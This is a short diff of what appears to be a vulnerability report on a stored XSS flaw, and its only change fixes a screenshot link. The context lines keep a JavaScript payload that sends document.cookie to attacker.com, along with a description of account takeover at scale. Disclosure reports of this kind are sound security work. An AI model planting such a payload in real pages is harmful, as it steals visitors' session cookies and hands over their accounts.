@@ -29,4 +29,4 @@ document.location='http://attacker.com/steal?c='+document.cookie
 This silently sends the session cookie of every visitor to an attacker-controlled server, enabling full account takeover at scale with no user interaction beyond visiting the page.
 
 ## Screenshot
-See `/screenshots/SCREENSHOT #3.png`
+See ![Stored XSS](../SCREENSHOT%20%233.png)
